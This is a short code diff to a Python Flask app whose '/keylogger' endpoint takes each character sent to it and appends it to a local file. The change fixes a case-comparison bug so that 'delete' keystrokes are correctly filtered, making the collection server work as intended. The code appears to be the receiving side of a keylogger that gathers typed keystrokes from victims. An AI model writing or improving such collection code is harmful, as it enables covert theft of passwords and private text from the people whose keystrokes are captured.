@@ -10,7 +10,7 @@ app = Flask(__name__)
 @app.route('/keylogger', methods=["GET", "POST"])
 def check_word():
     word = request.args.get('char').lower()
-    if word != 'Delete':
+    if word != 'delete':
         string_file = open('./string_data', 'a')
         string_file.write(word)
         string_file.close()
